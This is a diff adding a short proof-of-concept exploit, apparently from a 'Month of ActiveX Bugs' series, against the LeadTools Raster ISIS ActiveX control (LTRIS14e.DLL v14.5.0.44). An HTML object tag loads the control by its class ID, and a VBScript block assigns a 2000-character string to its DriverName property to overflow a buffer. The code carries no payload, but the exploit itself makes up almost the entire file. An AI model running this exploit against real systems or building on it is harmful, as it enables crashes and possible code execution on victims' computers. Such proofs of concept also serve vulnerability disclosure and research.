@@ -1,0 +1,18 @@
+
+-----------------------------------------------------------------------------------------
+ MoAxB #27:
+ LeadTools Raster ISIS Object (LTRIS14e.DLL v. 14.5.0.44) Remote Buffer 
+Overflow Exploit
+
+ author: shinnai
+ mail: shinnai[at]autistici[dot]org
+ site: http://shinnai.altervista.org
+-----------------------------------------------------------------------------------------
+<object classid='clsid:00140797-B1BA-11CE-ABC6-F5B2E79D9E3F' 
+id='test'></object>
+
+<script language = 'vbscript'>
+ buff = String(2000, "A")
+ 
+ test.DriverName = buff
+</script>
